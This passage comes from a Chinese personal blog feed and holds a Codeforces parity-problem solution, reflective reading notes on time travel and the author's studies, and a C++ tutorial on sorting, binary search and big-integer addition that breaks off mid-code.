&#123;</span><br><span class="line">            countC++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;D&#x27;</span> &amp;&amp; countD &lt; x) &#123;</span><br><span class="line">            countD++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> total = countA + countB + countC + countD;</span><br><span class="line">    cout &lt;&lt; total &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="B"><a href="#B" class="headerlink" title="B"></a>B</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240807140922143.png" alt="image-20240807140922143"></p><p>题意：</p><p>给定一个正整数数组，要求通过若干次操作使得数组中的所有元素具有相同的奇偶性（即全部是奇数或全部是偶数）。</p><p>原本我使用的是模拟，但是当有最大偶数时，没有考虑清楚，即：</p><p>择任意奇数与最大的偶数操作两次，可以造出一个比任何偶数都大的奇数，再使用该奇数操作即可。</p><p><a href="https://www.cnblogs.com/luckyblock/p/18342500">Codeforces Round 963 (Div. 2) - Luckyblock - 博客园 (cnblogs.com)</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">2e5</span> + <span class="number">10</span>;</span><br><span class="line">LL arr[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  cin &gt;&gt; num;</span><br><span class="line">  vector&lt;LL&gt; vec;</span><br><span class="line">  LL maxodd = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">    cin &gt;&gt; arr[i];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; num; i++) <span class="comment">//统计奇数偶数</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (arr[i] % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">      vec.<span class="built_in">push_back</span>(arr[i]);</span><br><span class="line">    <span class="keyword">if</span> (arr[i] % <span class="number">2</span> == <span class="number">1</span> &amp;&amp; arr[i] &gt; maxodd)</span><br><span class="line">      maxodd = arr[i];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (vec.<span class="built_in">size</span>() == num || vec.<span class="built_in">empty</span>()) <span class="comment">//全为奇数或者偶数</span></span><br><span class="line">  &#123;</span><br><span class="line">    cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">int</span> ans = vec.<span class="built_in">size</span>();</span><br><span class="line">  <span class="built_in">sort</span>(vec.<span class="built_in">begin</span>(), vec.<span class="built_in">end</span>());</span><br><span class="line">  <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x : vec) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; maxodd)</span><br><span class="line">      maxodd = x + maxodd;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      flag =</span><br><span class="line">          <span class="number">1</span>; <span class="comment">//择任意奇数与最大的偶数操作两次，可以造出一个比任何偶数都大的奇数，再使用该奇数操作即可</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cout &lt;&lt; ans + flag &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  cin &gt;&gt; n;</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="built_in">solve</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> codeforces </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> codeforces </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阅读笔记2024</title>
      <link href="/2024/08/02/%E9%98%85%E8%AF%BB/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B02024/"/>
      <url>/2024/08/02/%E9%98%85%E8%AF%BB/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B02024/</url>
      
        <content type="html"><![CDATA[<h3 id="平行世界"><a href="#平行世界" class="headerlink" title="平行世界"></a>平行世界</h3><p>2024-7 —— 2024-8，由于是第一次写，故只记录了后两章。</p><h4 id="夏娲回归"><a href="#夏娲回归" class="headerlink" title="夏娲回归"></a>夏娲回归</h4><p>​    <strong>火：</strong>人类到底是何时使用火的呢，据考古说法，在一百万年前的非洲，古人类在自然中发现了火，并尝试利用火种烹饪食物。随着时代发展，用火冶炼金属成为文明发展的一大进步。进入到工业时代，火被用于驱动机器，从蒸汽机到内燃机，极大促进了人类生产力的提升。到了现今21世纪，火似乎慢慢疏远我们，各种电器取代了火的位置，我们好似失去了这团火吗？我想，火也许就像神话中的神明那样，默默守护着我们，人类只是匆匆过客，得与借助火得力量腾飞。</p><p>​    <strong>时间改变者：</strong>当我们妄图成为一个历史改变着时，即使是移除路边一根小小的草，也可能极大改变之后的未来，所谓<strong>牵一发而动全身</strong>。简单从物质上来讲，在相对论物理学中，有时光锥这个概念：我们可以理解为<strong>过去光锥</strong>代表着从宇宙大爆炸到如今个人所有相关的事务；<strong>未来光锥</strong>是我们现在所触及处到未来，从我到与我相关的人事，从与我相关的人事再到……现今我们的一举一动都会改变未来的世界，似乎这就是一种永生（就像如今的大语言模型，也许这篇文章在不久的将来，将为众人所用）。也许所有人都得到了永生，或许直到宇宙塌缩，正可谓不求同年同月同日生，但求同年同月同日死。</p><p>​    <strong>好奇心：</strong>我们知道，好奇心是人的本性，好奇心驱动我们对未知事物的探索、学习和理解。人类第一次发现，使用火不正是出于好奇心？在第一个原始人捧起火种前，人们对火是恐惧的。当他拾起火种后，人们对火是敬畏的。<strong>星星之火，可以燎原。</strong>自此之后100万年时间，人类携带着火种，创造了进化史上的一片奇迹。人们常说，一切恐惧来源于未知，但是我们也要敢于用勇气、用好奇心去打破这一未知，只有踏出舒适圈，才能获得更广阔的空间。</p><h4 id="魔环"><a href="#魔环" class="headerlink" title="魔环"></a>魔环</h4><p>​    <strong>回到过去 —— 错乱与迷失 ：</strong>人一生，有许多遗憾。或是高考失利，或是错过初恋。我也常常幻想着自己拥有一台时光机，回到小时候，买彩票先赚他个小目标，或是挽回失去的时间。今天读到这一文章，感慨颇丰。假设我们可以回到过去，你愿舍去当今的为了来吗？如果我回到高中三年时光，在这三年时光分秒必争，不断努力，成功上岸 985，我会得到优异的学历，高薪的工作，迎娶白富美，走向人生巅峰，当然这一切都是未知的，毕竟我不可能真的穿越回去(●’◡’●)。可以对比下现在的我，高考后上了二本，现正在为未来做抉择。我想，我读完这篇文章后，大概率还是选择当今的生活吧。回想高中，虽然我学习称不上刻苦努力，但是在高中三年我收获了知心朋友，收获了许多快乐。也许是对高考的不甘，也许是对未来的迷茫，大学的第一年，我浑浑噩噩过去了。也许，人在某一刻是能觉醒的，在此刻之后，看清了未来的路，看清了自己的梦想。在大二，我开始尝试在各处突破我的视野、实力，我决定了，我要考研以弥补我的高考。似乎，大学四年的时光对我来说太过短暂，如今已是准大三，一件又一件挑战接踵而来，我也需要积极面对这一切。毕竟也许在另一时空的我，正在为保研陷入绩点漩涡，无法抽身；或是自责自己的智力，情绪低落。假如我有时光机，这成了一道选择题，选择这个，失去那个。既然选择当下，就请：<strong>加油，奥力给！</strong></p><h3 id="活着"><a href="#活着" class="headerlink" title="活着"></a>活着</h3>]]></content>
      
      
      <categories>
          
          <category> 阅读笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 阅读笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础算法</title>
      <link href="/2024/07/29/%E7%AE%97%E6%B3%95/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/"/>
      <url>/2024/07/29/%E7%AE%97%E6%B3%95/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><p>数据输入&gt;1000000时使用<code>scanf</code>，否则使用<code>cin</code>。</p><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><div class="table-container"><table><thead><tr><th style="text-align:center">排序算法</th><th style="text-align:center">平均时间复杂度</th></tr></thead><tbody><tr><td style="text-align:center">冒泡排序</td><td style="text-align:center">O(n2)</td></tr><tr><td style="text-align:center">选择排序</td><td style="text-align:center">O(n2)</td></tr><tr><td style="text-align:center">插入排序</td><td style="text-align:center">O(n2)</td></tr><tr><td style="text-align:center">希尔排序</td><td style="text-align:center">O(n1.5)</td></tr><tr><td style="text-align:center">快速排序</td><td style="text-align:center">O(N*logN)</td></tr><tr><td style="text-align:center">归并排序</td><td style="text-align:center">O(N*logN)</td></tr><tr><td style="text-align:center">堆排序</td><td style="text-align:center">O(N*logN)</td></tr><tr><td style="text-align:center">基数排序</td><td style="text-align:center">O(d(n+r))</td></tr></tbody></table></div><h4 id="快速排序——分治"><a href="#快速排序——分治" class="headerlink" title="快速排序——分治"></a>快速排序——分治</h4><ol><li>确定分界点</li><li>调整区间 </li><li>递归处理左右两端</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l &gt;= r)   <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//int x = [q(l + r +1) / 2], i = l - 1, j = r + 1;        </span></span><br><span class="line">    <span class="type">int</span> x = q[l + r &gt;&gt; <span class="number">1</span>], i = l - <span class="number">1</span>, j = r + <span class="number">1</span>;        <span class="comment">//  注意是向上取整,因为向下取整可能使得x取到q[l]</span></span><br><span class="line">    <span class="keyword">while</span>(i &lt; j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span> i ++ ; <span class="keyword">while</span> (q[i] &lt; x);             <span class="comment">//  不能取等号，因为若数据都相等则无限循环触发数组越界</span></span><br><span class="line">        <span class="keyword">do</span> j -- ; <span class="keyword">while</span> (q[j] &gt; x);             <span class="comment">//   do while 保证i,j一定更新</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; j)  <span class="built_in">swap</span>(q[i], q[j]);           <span class="comment">//可以使用if(i &lt;= j) swap(q[i], q[j]);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="built_in">quick_sort</span>(q, l, j), <span class="built_in">quick_sort</span>(q, j + <span class="number">1</span>, r);</span><br><span class="line">    <span class="comment">//quick_sort(q, l, i - 1), quick_sort(q, i, r);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//关于quick_sort()取i，j的问题，若为i则取右边界，若为j则取左边界</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">quick_sort</span>(q, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++ )   <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>C++ sort()</code>其实是小范围插入排序，大范围快速排序</p><h4 id="归并排序——分治"><a href="#归并排序——分治" class="headerlink" title="归并排序——分治"></a>归并排序——分治</h4><ol><li>确定分界点：二分之一</li><li>递归排序left,right</li><li>归并——合二为一</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> q[N],tmp[N];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(<span class="type">int</span> q[], <span class="type">int</span> l, <span class="type">int</span> r)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span>;<span class="comment">//结束递归返回</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;<span class="comment">//通过mid调整边界</span></span><br><span class="line"></span><br><span class="line">    merge_sort(q, l, mid), merge_sort(q, mid + <span class="number">1</span> , r);          <span class="comment">//递归，先比较最小的分组</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>, i = l, j = mid + <span class="number">1</span>;              </span><br><span class="line">    <span class="keyword">while</span>(i &lt;= mid &amp;&amp; j &lt;= r)</span><br><span class="line">        <span class="keyword">if</span> (q[i] &lt;= q[j])   tmp[ k ++ ] = q[ i ++ ];        <span class="comment">//比较两部分</span></span><br><span class="line">        <span class="keyword">else</span> tmp[ k ++ ] = q [ j ++ ];                  </span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid) tmp[ k ++ ] = q[ i ++ ];           <span class="comment">//将剩余值写入，</span></span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r) tmp[ k ++ ] = q[ j ++ ]; ·           <span class="comment">//由于前面的循环语句，这里最多只有一个while进行多次循环</span></span><br><span class="line">    <span class="keyword">for</span> (i = l, j = <span class="number">0</span>; i &lt;= r; i ++, j ++)  q[i] =  tmp[j];     <span class="comment">//写回数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++)    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;q[i]);</span><br><span class="line">    </span><br><span class="line">    merge_sort(q, <span class="number">0</span> , n<span class="number">-1</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, q[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="二分"><a href="#二分" class="headerlink" title="二分"></a>二分</h3><h4 id="整数二分"><a href="#整数二分" class="headerlink" title="整数二分"></a>整数二分</h4><ol><li>mid = (l+r+1)/2</li></ol><ul><li><p>true       [mid, r ]         l = mid</p></li><li><p>false      [l, mid - 1]        r = mid -1</p></li></ul><ol><li>mid = (1+r)/2</li></ol><ul><li><p>true        [l, mid]          r = mid</p></li><li><p>false       [mid+1, r]         l = mid +1</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i ++)      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp; q[i]);</span><br><span class="line">    <span class="keyword">while</span>( m -- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> x;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;           </span><br><span class="line">        <span class="keyword">while</span> (l &lt; r)       </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;               <span class="comment">//左半二分，确定左边界</span></span><br><span class="line">            <span class="keyword">if</span>(q[mid] &gt;= x) r = mid;              </span><br><span class="line">            <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( q[l] != x) <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-1 -1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; l &lt;&lt; <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">            <span class="type">int</span> l = <span class="number">0</span>, r = n - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">            &#123;   </span><br><span class="line">                <span class="type">int</span> mid = l + r +<span class="number">1</span> &gt;&gt; <span class="number">1</span>;        <span class="comment">//右半二分，确定右边界</span></span><br><span class="line">                <span class="keyword">if</span>(q[mid] &lt;= x) l = mid;</span><br><span class="line">                <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; l &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="浮点数二分"><a href="#浮点数二分" class="headerlink" title="浮点数二分"></a>浮点数二分</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">double</span> x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="type">double</span> l = <span class="number">-10000</span>, r = <span class="number">10000</span>;<span class="comment">//l和r表示n的范围</span></span><br><span class="line">    <span class="keyword">while</span> (r - l &gt; <span class="number">1e-8</span>)<span class="comment">//一般精度比题目+2次方</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">double</span> mid = (l + r) / <span class="number">2</span>;<span class="comment">//二分</span></span><br><span class="line">            <span class="keyword">if</span>( mid * mid * mid &gt;= x) r = mid;</span><br><span class="line">            <span class="keyword">else</span> l = mid;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;%lf\n&quot;</span>,l);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="高精度"><a href="#高精度" class="headerlink" title="高精度"></a>高精度</h3><p>A+B、A-B、A*b、A➗b</p><p>在<code>Java</code>中，可以使用<code>BigInteger</code>类来表示任意精度的整数，以及<code>BigDecimal</code>类来表示任意精度的浮点数。</p><p>在<code>Python</code>中，可以直接使用内置的<code>int</code>类型来表示任意精度的整数。Python的整数类型可以自动扩展以适应大数值，不会发生溢出。</p><h4 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h4><p><code>向量（Vector）</code>是一个封装了动态大小数组的顺序容器（Sequence Container）。跟任意其它类型容器一样，它能够存放各种类型的对象。可以简单的认为，向量是一个能够存放任意类型的动态数组。</p><h3 id="1-顺序序列"><a href="#1-顺序序列" class="headerlink" title="1.顺序序列"></a>1.顺序序列</h3><p>顺序容器中的元素按照严格的线性顺序排序。可以通过元素在序列中的位置访问对应的元素。</p><h3 id="2-动态数组"><a href="#2-动态数组" class="headerlink" title="2.动态数组"></a>2.动态数组</h3><p>支持对序列中的任意元素进行快速直接访问，甚至可以通过指针算述进行该操作。提供了在序列末尾相对快速地添加/删除元素的操作。</p><h3 id="3-能够感知内存分配器的（Allocator-aware）"><a href="#3-能够感知内存分配器的（Allocator-aware）" class="headerlink" title="3.能够感知内存分配器的（Allocator-aware）"></a>3.能够感知内存分配器的（Allocator-aware）</h3><p>容器使用一个内存分配器对象来动态地处理它的存储需求。</p><p><a href="https://www.runoob.com/w3cnote/cpp-vector-container-analysis.html">C++ vector 容器浅析 | 菜鸟教程 (runoob.com)</a></p><h4 id="A-B"><a href="#A-B" class="headerlink" title="A+B"></a>A+B</h4><ol><li>大整数存储，数组起始位置存放最低位置</li><li>按照数学加法原理进行计算</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; <span class="title function_">add</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; &amp;A, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; &amp;B)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt; C;</span><br><span class="line">        <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (A.size() &lt; B.size())   <span class="keyword">return</span> add(B, A); </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A.size() || i &lt; 